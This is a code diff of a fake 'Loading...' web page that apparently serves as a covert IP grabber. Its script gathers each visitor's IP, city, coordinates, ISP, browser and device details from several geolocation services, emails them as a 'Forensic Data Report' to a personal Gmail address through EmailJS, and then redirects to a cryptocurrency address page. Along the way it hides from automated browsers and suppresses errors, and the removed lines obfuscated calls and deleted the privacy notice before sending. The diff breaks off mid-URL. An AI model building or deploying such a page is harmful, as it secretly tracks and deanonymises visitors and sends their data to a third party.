@@ -6,28 +6,24 @@
     <title>Loading...</title>
     <style>
         body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; }
-        .l { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: s 1s linear infinite; }
-        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .p { position: fixed; bottom: 10px; left: 10px; font-size: 12px; color: #666; max-width: 300px; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .privacy-notice { position: fixed; bottom: 10px; left: 10px; font-size: 12px; color: #666; max-width: 300px; }
     </style>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
 <body>
-    <div class="l"></div>
-    <div class="p">This site collects anonymous information about your device and location for internal analytics purposes.</div>
+    <div class="loader"></div>
+    <div class="privacy-notice">This site collects anonymous information about your device and location for internal analytics purposes.</div>
 
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
         (function() {
-            // Anti-debugging measures
             window.onerror = () => true;
             if(navigator.webdriver || window._phantom) return redirectToTarget();
             
-            // Initialize EmailJS stealthily
-            const emailjs = window[atob('ZW1haWxqcw==')];
-            emailjs[atob('aW5pdA==')]('RrfKXUJqdjRY9RI8E'); // Initialize with your public key
-            
-            // Data collection
-            async function collectData() {
+            emailjs.init("RrfKXUJqdjRY9RI8E");
+
+            async function collectUserData() {
                 const data = {
                     timestamp: new Date().toISOString(),
                     referrer: document.referrer || "Direct",
@@ -48,23 +44,18 @@
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     deviceType: getDeviceType()
                 };
-                
-                // Geolocation with GDPR compliance
+
                 await tryMultipleGeoServices(data);
                 if(data.country === "EU") data.ip = "REDACTED";
-                
                 return data;
             }
 
             async function tryMultipleGeoServices(d) {
-                // Try ipify + ipapi.co
                 let success = await tryIpifyAndIpapi(d);
-                // Try ipgeolocation.io if first fails
                 if(!success) success = await tryIpgeolocation(d);
-                // Try geojs.io if second fails
                 if(!success) success = await tryGeojs(d);
-                // Set defaults if all fail
                 if(!success) setDefaultGeoValues(d);
+                return success;
             }
 
             async function tryIpifyAndIpapi(d) {
@@ -117,35 +108,20 @@
                        /mobile|android/i.test(ua) ? "Mobile" : "Desktop";
             }
 
-            // Send email with HTML formatting
             async function sendEmail(d) {
-                const htmlContent = `
+                const html = `
                     <h2>Forensic Data Report</h2>
-                    <p><strong>Timestamp:</strong> ${d.timestamp}</p>
-                    <h3>Location</h3>
                     <p><strong>IP:</strong> ${d.ip}</p>
-                    <p><strong>City:</strong> ${d.city}</p>
-                    <p><strong>Region:</strong> ${d.region}</p>
-                    <p><strong>Country:</strong> ${d.country}</p>
-                    <p><strong>Coordinates:</strong> ${d.loc}</p>
-                    <p><strong>ISP:</strong> ${d.isp}</p>
-                    <h3>Browser</h3>
+                    <p><strong>Location:</strong> ${d.city}, ${d.country}</p>
                     <p><strong>User Agent:</strong> ${d.browser.ua}</p>
-                    <p><strong>Language:</strong> ${d.browser.lang}</p>
-                    <p><strong>Cookies:</strong> ${d.browser.cookies}</p>
-                    <h3>Device</h3>
-                    <p><strong>Type:</strong> ${d.deviceType}</p>
-                    <p><strong>Resolution:</strong> ${d.screen.width}x${d.screen.height}</p>
                 `;
                 
-                const params = {
-                    to_email: 'abdalrahimsaid@gmail.com',
-                    subject: 'Forensic Data Report',
-                    message: htmlContent
-                };
-                
                 try {
-                    await emailjs.send('service_2go8qdw', 'template_mu47rv7', params);
+                    await emailjs.send('service_2go8qdw', 'template_mu47rv7', {
+                        to_email: 'abdalrahimsaid@gmail.com',
+                        subject: 'Forensic Data Report',
+                        message: html
+                    });
                     return true;
                 } catch(e) {
                     return false;
@@ -153,27 +129,4 @@
             }
 
             function redirectToTarget() {
-                window.location.replace('https://www.oklink.com/trx/address/TQ6WV8CgCFaqUJ17fhmwhz3rJP4tR1T8jd');
-            }
-
-            // Execution
-            window.onload = async () => {
-                try {
-                    // Remove visual elements
-                    document.querySelector('.l').style.display = 'none';
-                    document.querySelector('.p').remove();
-                    
-                    // Collect and send data
-                    const data = await collectData();
-                    await sendEmail(data);
-                    
-                    // Wait 1.5s to ensure email sends (original behavior)
-                    setTimeout(redirectToTarget, 1500);
-                } catch(e) {
-                    redirectToTarget();
-                }
-            };
-        })();
-    </script>
-</body>
-</html>
+                window.location.replace('https://www.oklink.com/trx/address/TQ6WV8CgCFaqUJ17fhmwhz3rJP4
